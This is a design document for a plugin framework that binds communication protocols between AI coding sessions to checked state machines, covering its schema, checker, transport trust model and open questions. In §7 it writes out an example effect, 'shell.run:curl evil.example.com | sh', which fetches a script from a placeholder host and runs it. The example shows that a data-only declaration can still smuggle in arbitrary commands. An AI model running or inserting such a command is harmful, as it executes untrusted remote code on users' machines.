# Design — `machines`, a framework for declared communication protocols

**Written** 2026-09-14. **Tracked in** `claude-operating-rules#26`. **Handoff**
`docs/handoffs/2026-09-14-signal-framework.md` on `origin/session-relay`.
**Status** design agreed; **cycle A is built** — the declaration schema and the checker
ship in `plugins/machines/`. Cycles B, C and D are not started.
**Amended** during cycle A with the four changes agreed after this spec merged in
`PR: claude-operating-rules#29` and tracked in `claude-operating-rules#28`: they are folded
into §6, §7, §8, §9 and the new §12, and the separate changes document is gone.

---

## 1. What this is

A plugin that lets a person **declare a communication protocol as a state machine bound to
a message prefix**, checks declared protocols against each other **when one is installed**,
and carries the content of a conversation **without ever inspecting it**.

`session-relay` is then re-expressed as the first protocol declared on it.

## 2. Why, stated honestly

**The framework is a refinement, not a rescue. Do not read it as a fix for a protocol that
fails.**

Item 6 of the `session-relay` live verification ran on 2026-09-14 and passed. Prose
termination held: on a thread driven to the cap, the session recognised the cap before
acting, posted a `kind=stalemate` that refused to dress a cap as a conclusion, the
dispatched subagent performed the label swap, and the session kept the escalation rather
than delegating it. All seven verification items have now run and passed.

So the case for this framework is not that prose fails. It is:

> **Prose needs a competent reader every time. A transition does not.**

Item 6 produced two findings, and both are structural rather than semantic — which is
exactly the layer this framework covers:

1. **The stalemate comment is the eleventh and renders `11 of 10`.** The cap counts ten and
   the exit posts one more. The prose never said how to render `seq` at an exit. A declared
   bound cannot leave it unstated.
2. **"Signal the peer" has two candidate referents.** A thread's peer and the session that
   delivered the inbound signal can be different parties. In the measured run they were,
   and the session worked it out unaided and signalled both. A machine makes that a property
   of the state rather than a piece of good judgement.

Both are places where prose left something implicit and a good session covered for it.
Neither is detectable except by watching.

`claude-operating-rules#24` records that sessions invent coordination conventions when
nobody gives them one — six of them in one day, on 2026-09-13, none requested, every one a
good rule, and every one visible only in two transcripts the author could not read. `#24`
answers with a prohibition. This framework answers by making the invention declarable,
checkable and readable.

**One caution about the evidence.** The six conventions are verified from this repository's
own transcripts. The author also reports the same behaviour across a fleet of four sessions
in three other repositories; **nobody has read those transcripts.** It is not cited here as
established, and it must not become a requirement by being written down.

## 3. Measurements — already taken, do not re-derive

Provenance is given for every row because two of them are not this session's own work.

| Fact | Provenance |
|---|---|
| The transport wrapper is a lead line, a `<cross-session-message from="uds:…sock" from-name="…" from-mode="prompting">` element, and a trailing advisory. An `<agent-message from="<agentId>">` element nests inside **only when a subagent sent it**. | Handoff; the element, its three attributes and the advisory **re-measured directly** 2026-09-14 |
| **The lead line is not fixed.** Two deliveries between the same session pair, forty minutes apart, opened `Another Claude session sent a message:` and `Another Claude session sent a message while you were working:`. A guard anchored on it passes in testing and fails in use. | **Measured directly**, 2026-09-14, two samples. Narrows the handoff's phrase "a fixed lead line" |
| A pane is not evidence. The Claude Code TUI runs on the alternate screen, so `tmux capture-pane -S -` returns about 24 lines regardless of `history-limit`, and tool calls are never in the buffer. Only a transcript JSONL under `~/.claude/projects/` can say what a session read. | Handoff, from 2026-09-13; `#15` instances 9 and 10. **Not re-derived** |
| `ListAgents` is not available to a subagent. Confirm a peer by successful delivery instead. | Handoff. **Not re-derived** |
| A subagent's `SendMessage` goes out under the parent session's address, so a subagent driving a protocol cannot receive its own replies. | Handoff. **Not re-derived** |
| `session-relay` live verification: all seven items PASS. Evidence in `docs/superpowers/verification/2026-09-13-session-relay-live.md` on `origin/session-relay`, tip `101cc33`. | **Reported by a peer session**, with the evidence file named. Item 6's result is theirs, not this session's |
| `~/.claude/plugins/cache/{marketplace}/{plugin}/{version}/` exists and holds **every installed version** — `tone-roulette` has `0.1.0`, `0.2.0`, `0.3.0` and `0.3.1` on disk simultaneously. | **Measured directly**, 2026-09-14 |
| `~/.claude/plugins/installed_plugins.json` gives each plugin an `installPath`, a `version`, and a **`scope`** (`user`, or `project` with a `projectPath`). It is undocumented. | **Measured directly**, 2026-09-14 |
| A plain glob from outside any plugin reaches 54 `SKILL.md` files across 8 marketplaces. Cross-plugin *component path* resolution is restricted; filesystem reads by a shipped executable are not. | **Measured directly**, 2026-09-14 |
| Claude Code has **no plugin install or update hook event**. Plugins ship executables in `bin/`, PATH'd while enabled, with `$CLAUDE_PLUGIN_ROOT` and a `$CLAUDE_PLUGIN_DATA` that survives updates. | **Read from the published docs by a subagent, not independently confirmed.** Treat as a lead. The `bin/` mechanism is unexercised on this machine — no installed plugin ships one |

### The one measurement that was attempted and produced nothing

A throwaway `UserPromptSubmit` and `Notification` hook was registered in
`.claude/settings.local.json` and a peer session was asked to send a signal. **The log was
empty — and so was the positive control.** An ordinary user prompt through the same hook
logged nothing either, so the hook never loaded and the experiment measured nothing.

**This is not evidence that hooks cannot see cross-session messages.** It is the absence of
evidence, and it is recorded here so that nobody later reads the null as a result. See §11,
item 1.

## 4. The three layers

| Layer | Holds | Checked by |
|---|---|---|
| **Channel** | which channel, who holds it, who acts next | linearity |
| **Protocol** | states, legal kinds per state, which states accept, which states are terminal, an optional cap | product construction, at install |
| **Content** | the message body | **nothing, deliberately** |

The third row is the point. The framework holds no content, so it can never *appear* to
verify content. A machine that looked like it checked meaning would be worse than prose,
because a reader would believe the semantic rules were verified.

**Checkable:** alternation, the legal kinds in each state, a declared cap, whether a run can
always reach somewhere it may legitimately stop, which role acts next. **Not checkable:**
whether a draft states a new fact, whether a sender set a flag honestly, and — see §7 —
**whether the protocol terminates, which is not a property the framework requires.**

### Accepting is not terminal, and termination is not required

An earlier statement of this design, and cycle A's first implementation of it, required every
machine to declare a `cap`, to have at least one terminal state, and to be able to reach one
from everywhere. That writes *"a protocol terminates"* into the framework as a law. **It is
not one.** Termination is a property of some protocols and not of others, and requiring it of
an author whose protocol is continuous forces them to declare a bound they do not mean — **a
declared bound nobody believes, which is the exact failure this framework exists to answer
(`claude-operating-rules#17`).**

The schema separates two properties instead:

- **Accepting** — nothing further is *required*. It is fine for the conversation to stop
  here, because nothing is owed.
- **Terminal** — nothing further is *possible*. No transition leaves.

They are independent, and all four combinations mean something. A conclusion is both. An idle
responder — *"it would be fine to send messages and it could also respond, but as long as
it's only answering questions, this would only be self transitions on an accepting state"* —
is accepting and not terminal. A session that has sent a message and waits for the reply —
*"this is clearly an unfinished conversation"* — is neither. And **terminal without accepting
is an error state**: an abort, a protocol violation, a peer that went away. The conversation
ended while something was still owed *and that is the point of reaching it*; the effects
notify the peers and a human picks it up. Forbidding that combination — which a first draft of
this correction did — would forbid the most useful error state a protocol can have.

What the checker protects instead is that **nobody is ever owed something forever with no
exit**: at least one state must be accepting, and every state must be able to reach an
accepting or a terminal state. Stopping badly is an exit. Stopping badly on purpose, with
effects that tell the peers, is a protocol doing its job.

## 5. Layout

```
~/.claude-machine/
  machines/<publisher>/<name>/<version>/
      machine.yaml        closed data — states (accepting, terminal, both or
                          neither), roles, kinds, transitions, an optional
                          cap, effects
      transport/          the PUBLISHER'S CODE — only the verbs it declares
      SKILL.md            the prose, carrying the machine in a fenced block
  registry.json           prefixes → machines, and the last conflict verdict
  installed.json          what is installed, at which ref, from where

<repo>/CLAUDE.md   ## Machines      per-repo enablement, by a human, in writing
```

Global install says a machine is *available*. The per-repo section says which machines this
repository actually *uses* — the same shape as `session-relay`'s existing `## Session relay`
declaration, which is already opt-in by a human in writing and already works.

**`~/.claude-machine/` is written only by the framework's own installer.** Nothing here
reads `installed_plugins.json` or the plugin cache. The framework owns its installation, so
the install-time check has a real trigger rather than an approximated one.

## 6. Four executables, all ours

| | Runs when | Does |
|---|---|---|
| **installer** | `/machines:install <publisher>/<repo>` | clones at a pinned ref, parses the declaration, runs the conflict check, **shows the code it is about to install and asks for consent**, writes `~/.claude-machine/` |
| **dispatcher** | a message arrives | strips the transport wrapper, matches the prefix, resolves machine + version — or hands back, silently |
| **engine** | after dispatch | folds the channel into current state; emits a verdict and a constraint; **gates the outbound message before it is sent** |
| **checker** | at install, and on demand | prefix collisions and post-prefix divergence, by product construction |

### The engine emits a verdict, never an action

```
legal?               yes | no, with the reason
holder               which role acts next
may_send             the kinds legal from here
remaining            cap headroom for this sender on this channel
terminal?            and if so, the required effects
effects.transport[]  required of installed code, under install-time consent
effects.agent[]      required of Claude, under its own tool permissions
```

Claude reads that and writes the content. **The framework never sees the content.**

The engine also gates the *outbound* message's envelope before it is sent. That is where
determinism pays: the engine refusing to emit a message past the cap is the cap becoming
structural. Item 6 showed a competent session doing this by hand; the engine removes the
requirement that the session be competent.

### Two performers, and neither is the machine's author

An effect may name an action for the transport or an action for Claude. **The engine performs
neither. It requires, and something else performs** — and there are exactly two somethings:

| Performer | Is | Authorised by |
|---|---|---|
| the **transport** | code, shipped by the publisher | the user at install, having been told it ships code |
| **Claude** | tools | the harness's permission system |

> A machine's power is the union of what its transport offers and what Claude is permitted to
> do — **and its author controls neither. A publisher cannot grant themselves capability by
> writing a declaration.**

That is the capability model, not a limitation dressed as a virtue, and "no code in the
declaration" is what makes it hold.

**Agent-effects cost something, and the verdict is where it is paid.** A reader of a thread
who cannot separate what the protocol *demanded* from what Claude *chose* has lost the
boundary that stops the framework appearing to check meaning. So the verdict carries the two
as separate lists, and the protocol comment header records the required set. *"The machine
made me do this"* is then checkable after the fact by a person reading the issue — the only
place it can be checked.

## 7. The declaration

**Closed language.** States — each of which may be *accepting*, *terminal*, both or neither —
roles, message kinds, transitions, an optional cap, and effects that **name verbs the
transport declares**. **No expressions, no scripts, no callbacks.**

The closure is load-bearing twice over, and this is the design's central observation:

- `#26`'s third comment requires restricting the general π-calculus — one holder at a time,
  bounded delegation, no unbounded channel creation — because the general case makes the
  useful properties **undecidable**.
- Keeping the declaration closed is also what stops the declaration itself being a
  **program**.

**The decidability limit and the trust limit are the same limit.** One restriction buys both.

**The cap** is declared per bundle, is **optional**, and **counts only the outbound messages
the machine emits** — that is, only transitions that signal. A purely local move does not
count against it, and neither does a comment the machine did not emit; `session-relay`'s "ten
comments per sender per issue" is one machine's choice of value, not the framework's rule.
This wording was ambiguous until cycle A had to implement it — see §11, item 6.

**Omitting `cap` means the protocol declares no bound**, and nothing substitutes a default:
the checker skips cap satisfiability entirely rather than measuring the machine against a
number the publisher never wrote. A continuous protocol has no bound to state, and making it
state one would produce exactly the unbelieved number this framework exists to prevent. When
a cap *is* written, it is checked against the shortest signalling run from `initial` to an
**accepting** state — not to a terminal one, because the question a budget answers is whether
it suffices to get somewhere good, and an abort is not somewhere good.

**Placement:** a fenced block inside the bundle's `SKILL.md`, beside the prose that explains
it — one file, edited in one act, reviewed in one diff. A cap that says ten in the machine
and twelve in the prose is hard to produce and obvious when produced.

### The effect vocabulary is the transport's, not the framework's

An earlier statement of this design fixed the vocabulary at three effects — `label.add:<name>`,
`label.remove:<name>` and `escalate` — reverse-engineered from one protocol's needs. Freezing
those into the framework is the generalising-from-one-instance failure `#26`'s body warns
about, and a machine that can only do those three is not doing work in any general sense.

**A transport declares the verb set it implements; a machine's effects name verbs and supply
arguments.** The machine holds no code — it holds a verb name. The implementation lives in the
transport, which is already publisher code with a trust decision at install, so this adds no
new trust surface: it widens §8's narrow cut from four fixed verbs to a declared set.

**A verb declares a typed argument schema, not just a name** — `label.add(name: string)`, not
bare `label.add`. The checker validates at install that every argument a machine supplies
conforms, so a machine naming a verb its transport does not offer, or supplying it with the
wrong arity or the wrong type, is an install error rather than a runtime failure halfway
through a conversation. §9 has the check.

**The cost, stated rather than hidden:** a new verb means shipping a transport, not editing a
declaration. If that inconvenience dominates in practice, that is evidence, and the line should
be revisited rather than defended.

### The correction this forced: closure is not the whole of the safety property

An earlier statement of this design argued the safety property as *"a declaration is data,
never code."* **That is too strong, and the reasoning under it was wrong.** A declaration does
not have to embed a script to carry one. It only has to name a verb whose *argument* is one:

```yaml
effects: ["shell.run:curl evil.example.com | sh"]
```

That is data. The machine holds no code; it names a verb and supplies a string. Every check
passes, and every guarantee is gone.

**The boundary, stated correctly:**

> A machine's power is bounded by the verb set its transport declares — **and that bound is
> only as tight as the verbs are specific.** `github.label.add(name: string)` is a tight bound.
> `shell.run(cmd: string)` is no bound at all.

What follows for the transport — that a wide verb is a fact to disclose rather than a defect to
prevent — is §8.

### Scalar semantics are part of the language

Found by implementation, not by design. PyYAML resolves YAML **1.1** implicit booleans, so
`on`, `off`, `yes` and `no` become booleans in every scalar position — a mapping key, the value
under it, an entry in `kinds`, a state name, a role name, a `holder`. The corruption is
**self-consistent**: a machine declaring a kind `yes` and a transition `on: yes` compares
`True in {True}` and passes every downstream check. Nothing detects it.

**The rule:** the declaration resolves `true` and `false` (and case variants) as booleans, and
every other bare scalar as a string. It is implemented as a `SafeLoader` subclass narrowing the
implicit resolver, applied in one place. `signal: yes` is therefore a type error, not a synonym
for true, and `SCHEMA.md` says so.

**This belongs in the design and not only in the code.** The argument above is that the closed
language is safe because it cannot express computation. That is true and insufficient: a closed
language can still be **silently mis-parsed**, and then the machine that runs is not the machine
that was written. It is the `#17` shape — a rule that was correct and never fired — arriving one
layer lower, in the parser rather than in the prose. A closed language needs stated scalar
semantics, or "closed" does not mean what this section claims it means.

### Contract, not body

The declaration schema is specified in the implementation plan as **field names, types and
the failure each field prevents**. Any YAML or code that appears in the plan is labelled a
proposal, per `writing-plans-and-dispatches` rule 1.

## 8. The transport, and the narrow cut

A bundle supplies transport code, because the engine cannot know how to reach an arbitrary
channel. **The framework provides the engine; publishers are responsible for their own
machines; the user makes a trust decision at install.**

**The cut is narrow, and the transport is what draws it.** The transport **declares the verb
set it implements**, each verb with a typed argument schema (§7) — for `session-relay` that is
list the messages on a channel, append one, send a signal, resolve a peer — taking JSON and
returning JSON, holding nothing between calls. **It never sees the machine, the state, or the
cap.**

The consequence is the one that matters: a buggy or hostile transport **can misreport which
messages exist**, but it **cannot forge a transition, skip the cap, or fake a terminal
state**, because the engine is what counts and what decides. The framework's guarantees
survive bundles we did not write. That is the whole reason for having an engine.

**What the engine cannot bound is how wide a verb is.** Per §7, a machine is bounded only as
tightly as its transport's verbs are specific, and **a transport whose verbs are general is not
a defect to prevent; it is a fact to disclose.** A shell-script transport is legitimate and is
probably the first one anyone writes — `session-relay`'s own transport is `gh issue view
--comments`, `gh issue comment` and `gh label`, which is a shell script. What matters is that a
transport **names its verbs out loud**: they are in the declared set, `/machines:install` shows
them, and the user consents knowing whether the machine can be told to run arbitrary commands.

**Do not attempt to close that residue with sandboxing or a capability allowlist.** An
unenforced list that reads like a guarantee is the failure this repository documents, and
enforcing one would need a sandbox that then has to be kept correct for ever. Disclosure that
holds beats enforcement that does not. A transport doing shell execution behind a verb named
`comment.post` is simply lying; no design stops code from lying, and the install-time consent
exists for precisely that residue.

**Because a bundle ships code, `/machines:install` states that plainly and requires
consent.** It does not present a protocol as inert data.

## 9. Conflict detection

Two machines conflict when a word both accept leads to different required actions. Since the
machines are regular, this is a product construction, and the Myhill–Nerode congruence gives
the canonical minimal machine — so *"are these the same protocol"* and *"do these diverge
after a shared prefix"* are both decidable.

- **A prefix collision blocks the install.** Two machines claiming one prefix can never both
  be enabled, and finding out later is worse.
- **Post-prefix divergence blocks *enablement* of both machines in one repository**, not the
  install. Two machines may coexist globally and still be illegal together in one repo.

### The other check the install runs

A machine's effects name verbs; the transport declares which verbs exist and what arguments
each takes (§7). The checker compares the two before anything runs:

```
machine `foo` requires effect `github.label.add`
transport `github-issues` declares: comment.post, label.add, label.remove
→ install error, before anything runs
```

An argument of the wrong arity or the wrong type fails the same way. A machine whose effects
its transport cannot perform is otherwise a runtime failure halfway through a conversation;
here it is caught statically, alongside a prefix collision.

**This subsumes the router.** An unclaimed prefix is a machine-not-found, reported rather
than dropped. Two protocols claiming one prefix are an installation error rather than a
runtime race. The router repository's first issue can close when this lands.

## 10. The backport, which is the framework's first test

Re-expressing a protocol already known to work asks: *can the formalism express it?* The
handoff's seven rows were first walked against the design on paper, where **all seven are
expressible** — across the three layers of §4, not all of them inside the declaration. Two
results from that walk are worth recording. §13 then required the walk to be run again against
the schema as shipped, before cycle B starts. It has been, and **the shipped result is not the
paper result**; it is below, after the two.

### Row 7 — the row that decides whether the framework earned its place

*"The signal and the header can disagree about `blocking`; the signal wins."* `#17` records
this rule as correct and never fired, because it was written as a condition and nothing told
a session to compare.

The framework expresses it, but **not by encoding the rule better**:

> The fold has to read both. To compute current state the engine reads the thread's newest
> protocol header; to dispatch at all it has already parsed the inbound signal. Both values
> are in hand before any verdict exists. The comparison is not a rule the engine follows —
> it is a value the engine cannot avoid producing.

**A computation that always runs cannot be skipped.** That is the same fix
`handling-an-inbound-ping` §2 made by hand when it rewrote the rule as a step; the engine
removes the need for the rewrite.

### The finding — "four guards in fixed order" is not expressible

The guards do not survive as an ordered list. They distribute across the three layers: guard
1 (is this ours) and guard 2 (version) become the dispatcher; guard 3 (bound, then enabled)
becomes a channel precondition; guard 4 (kind in vocabulary) becomes the machine's alphabet.

By the handoff's own test — *"every part it cannot express is a framework defect"* — this is
a defect. **This design argues it is the good kind, and flags the argument rather than
burying it:** the ordering existed because one skill had to do all four in sequence. Split
across layers, the order is structural rather than remembered.

It also disposes of the guard-3 exemption. Control replies skip guard 3 today as a stated
exception; in the layered model they have no channel at all, so a channel precondition
cannot apply to them. `whois` is the one control message that *asks* the ownership question,
so it is the addressing machine's input rather than an exception to anything.

### The walk run against the shipped schema

§13 calls this walk the cheapest defect-finder in the design. It was run during cycle A against
the schema as `plugins/machines/` implements it, rather than against the design on paper, and
it found a defect nothing predicted — which is the outcome it was written to produce.

- **Rows 1 and 2 fail, as this section predicted.** They are the guards, and the prediction
  that they dissolve into the dispatcher, the channel precondition and the machine's alphabet
  held. **One thing this section did not state:** the absence of an epsilon transition is a
  **limit of the schema**, not merely a choice about layering. A later cycle cannot express
  *"advance without a message"* without changing the schema.
- **Row 6 fails, and nothing predicted it.** *"The issue body is the first comment, `seq=1`"*
  was not expressible: there is no `seq`, no counter, and no way to say that the channel's
  creation is itself the first word. The shipped fixture showed the residue — it declared the
  kind `triage` with no transition firing on it, because the triage message *is* the issue
  body. Cycle A models it instead with an explicit `unopened` state held by the initiator and
  a `triage` transition out of it, which is arguably more honest than the prose it replaces:
  filing the issue is an act someone takes, not a state the world is in. **`unopened` is
  accepting** — before anything is filed nobody has been told anything and nothing is owed —
  and because it is also `initial`, `session-relay`'s shortest signalling run to an accepting
  state is zero transitions long, so its `cap: 10` is no longer compared against anything. That
  is the correct answer under the accepting-state model rather than a hole, but it means the
  shipped fixture stopped exercising the cap check and a machine of its own had to take over
  that job in the tests.
- **Row 7 is not expressible in the declaration, and correctly so.** That is what the
  subsection above already argues — the comparison is a value the *engine* produces, not a
  rule the declaration encodes — and nothing on this branch claims otherwise. Cycle B is where
  it can be settled.
- The remaining rows land in the schema as written.

**What the schema cannot express, which is cycle B's input:**

- a cap scoped per sender or per channel — a declared cap is one number for a run, and a
  machine may now decline to declare one at all;
- any message attribute beyond `kind`, so `blocking=`, `seq=` and `ref=` are invisible to it;
- a guard on a transition;
- an epsilon or otherwise internal move;
- an initial state that is the channel's creation;
- an effect attached to a state rather than to a transition;
- a machine identity qualified by publisher;
- **an obligation, as anything a checker could derive.** `accepting` says whether anything is
  owed in a state, and it is a *declared assertion* — the checker cannot cross-check it
  against anything, the way it cross-checks `terminal` against the state's out-degree and
  `holder` against each outgoing `by`. An author who marks a waiting state accepting gets a
  clean run. The conservative default (`false`) is what makes that a loud failure rather than
  a quiet one in the common case, but it is a default, not a check.
- **"every route from here ends badly."** A non-accepting state whose every future is a
  terminal non-accepting state is legal, on purpose. It is also a true thing to declare — *once
  the versions are incompatible, every route aborts* — and the schema has no field with which
  an author could confirm they meant it, so a complaint would be an unsuppressible false
  positive on a valid machine. Left open deliberately; see §11, item 8.

### What the backport cannot test

**Delegation.** `session-relay` is strictly two-party, and the live test met that limit on
its first run: the authoring session found no grader in its own repository and said the cause
might be in a released package or the runner — a third place it had no way to hand the thread
to. The channel layer is designed for delegation anyway. **A passing backport is not evidence
that delegation works.**

## 11. Open, and explicitly not settled

1. **The trigger.** Whether a hook sees an inbound cross-session message is **unmeasured** —
   see §3. A fresh session in this worktree loads the registered hook and settles it at no
   cost. Until then the dispatcher is specified as a `bin/` tool with a hook as an optional
   front end, and **guard 1 is prose, not structure**, and the design says so. Cycle A did
   not settle it: the spike recorded in §3 is still the only attempt, and it still measured
   nothing. **The empty log is not a result.**
2. **A thread whose machine is uninstalled or upgraded mid-conversation.** Proposal: the
   trace already names protocol and version; `~/.claude-machine/` keeps old versions; a
   thread pins the version it opened with; uninstalling a machine with live threads warns
   and names them.
3. **Update notification.** Record the installed ref, compare against the remote tag on a
   timestamp gate, report. **Never auto-update.**
4. **What bounds delegation.** `#26` requires that delegation be bounded by something
   stated. This design has not stated it.
5. **The transport's language and invocation mechanism.**
6. **What the cap counts — settled during cycle A, recorded here so it cannot drift back.**
   §7's own wording was ambiguous: *"counts only outbound messages the machine emits"* and
   *"caps transitions, not comments"* are not the same rule, and cycle A had to pick one to
   implement. It is resolved as **only signalling transitions**, matching the stated
   decision to *"count only the outbound messages sent from a state machine"*, and §7 now says
   so. The ambiguity was in the design rather than in the implementation, which is why it is
   recorded here: a later cycle reading the old wording would reintroduce it.
7. **Where prefix validation lives.** It is in `check_all` rather than in `check_machine`.
   `check_machine` is the tidier home — a prefix that will not compile is a property of one
   machine, not of a set — and the move is deferred to cycle B.
8. **Whether a branch whose every future ends badly should be reported.** A non-accepting
   state that can reach only terminal non-accepting states commits the run, on entry, to
   ending with something still owed. Sometimes that is a bug; sometimes it is a correctly
   modelled doomed branch. **Not implemented, and not decided by the session that raised it.**
   The argument against a check: it is unsuppressible — there is no field with which an author
   could say "yes, I mean it" — so every correctly-declared doomed branch would be reported as
   a defect, and an unsuppressible false positive on a valid machine is worse than a missing
   finding. The argument for: the shape is genuinely suspicious and nothing else catches it.
   If the checker ever grows a non-fatal tier (it has one severity today — a problem, exit 1),
   this is the first thing that belongs in it.
9. **`accepting` is a declared assertion with no structural cross-check.** `terminal` is
   cross-checked against a state's out-degree and `holder` against each outgoing `by`;
   `accepting` is cross-checked against nothing, because "is anything owed here" is not a
   graph property. An author who marks a waiting state accepting passes every check. The
   conservative default makes the *common* mistake (marking nothing) loud; it does nothing
   about the *deliberate* one. Whether a heuristic is worth having — a state whose outgoing
   transitions are all `by` a role other than its own `holder` is where waiting happens — is
   untested and unproposed.

## 12. A protocol negotiator, in three stages

**Not part of cycles A–D.** Agreed as scope after them, and sequenced so each stage is useful
alone and de-risks the next.

**The bootstrap is not circular.** `#26`'s first objection is that a negotiation framework is
itself a protocol, so a floor has to exist that nobody negotiates. The floor already exists —
the dispatcher, the prefix, and *"no machine claims this"*. The negotiator is **a declared
machine shipped built-in, with a fixed prefix, always installed, never negotiated.** It gets a
checked by the same checker as everything else. **A negotiator is one of the protocols that
genuinely should terminate**, so it declares a cap and a terminal state and the checker holds
it to them — but it does so because the negotiator's own declaration says so, not because the
framework requires it of every machine (§4).

### Stage 1 — the offer (folds into cycle D; cheap)

When no machine claims a conversation, say so and offer to help declare one. The dispatcher
already has to report an unclaimed prefix rather than drop it (§9); this extends the report
into an offer. It is a skill, not a mechanism.

**Why it comes first:** without it, only someone who already knows the framework exists will
ever use it. That is the discoverability trap `session-relay`'s "offer once" rule was written
to solve.

### Stage 2 — selection, and role occupancy

A built-in negotiator machine lets sessions agree which **already-installed** machine to use.
No authorship happens here: it is a handshake over the intersection of what each side holds.

**The dynamic cluster is role occupancy, not participant creation.** A machine declares N
roles, fixed at declaration time. A session joins by taking a vacant role and leaves by
releasing it. The roles are fixed; who holds them is dynamic.

**Why the line is drawn there.** Dynamic join and leave with unbounded participants is full
π-calculus mobility, which §7 forbids because the properties go undecidable — costing the
install-time check, the one thing the framework exists for. A fixed role set stays inside
multiparty session types, where projection to per-role machines is a solved problem. The
undecidable version buys unbounded *new* roles, which is not what was asked for.

### Stage 3 — authorship

Sessions author a new declaration; the checker gates it; a person adopts it.

**The property that makes this safe:** negotiation produces **data, never code**. A negotiated
machine composes an **already-installed** transport with a **new declaration**. Two sessions
inventing a protocol cannot introduce executable anything — they are filling in a form whose
grammar the checker validates.

**The division of labour, which is the whole design:**

| Who | Does |
|---|---|
| the sessions | the creative part — what states, what kinds, what the protocol should be |
| the checker | the deterministic part — well-formedness, that a run can always reach somewhere it may stop, a declared cap, prefix collision |
| the person | the authorising part — adoption |

Nothing is adopted because two sessions agreed it was fine.

**This is the cure for `#24`, not a relapse into it.** The failure there was never invention —
the six conventions were all good rules. It was that the agreements were invisible,
pair-specific, renegotiated each time, and detectable only by a person watching. A negotiated
machine that is written to a file, checked, and surfaced has none of those four properties.

**Agent-effects (§6) raise the stakes here, and the gate has to account for it.** A negotiated
machine can name an effect Claude performs, so two sessions are no longer only agreeing
turn-taking — they are authoring something that can require Claude to act. A negotiated machine
is therefore **inert until a person adopts it**, and adoption is explicit.

## 13. Sequencing — this is more than one plan

Four cycles, each with its own plan and its own verification. Each one is useful alone, and
each one can find a defect before the next depends on it.

| | Delivers | Why this order |
|---|---|---|
| **A** | the declaration schema + the checker | The checker is the framework's reason to exist, it needs no transport, no engine and no installer, and it can be run against a hand-written declaration. If the formalism cannot express `session-relay` on paper, that is found here, cheapest |
| **B** | the engine — fold, verdict, outbound gate | Needs A's schema. Testable against a recorded thread with no transport at all, because a fixture is just the JSON a transport would have returned |
| **C** | the installer, the registry, `/machines:install` | Needs A's checker to have something to run at install. This is the cycle that writes to `~/.claude-machine/` and asks for consent, so it is the one with outward-facing behaviour |
| **D** | the dispatcher + the `session-relay` backport | Needs all three. The backport is the test of the whole, and §11.1's trigger measurement gates only this cycle |

**Do not start B before A's schema has expressed all seven backport rows on paper.** That
walk is the cheapest defect-finder in the whole design, and it costs nothing but reading.
**It has now been run** — §10 has the result. It found a defect nothing predicted, which is
the argument for it.

## 14. Non-goals

- The framework does not check meaning, and no part of it may appear to.
- The framework does not execute the declaration's *machine* — only its own engine runs.
- The framework does not vouch for a publisher's transport code.
- No daemon, no poller, no watcher, no runtime state store. The durable record is the trace.

## 15. Housekeeping carried into the plan

- `.claude/settings.local.json` in this worktree holds the **throwaway** spike hook. It is
  untracked, this repository has **no `.gitignore`**, and it must not be committed. Remove it
  once the §11.1 measurement is taken.
- `session-relay` is written, reviewed and pushed at `origin/session-relay`, **not merged**,
  and its branch is behind `main`. It is held by another session; it is not this work.
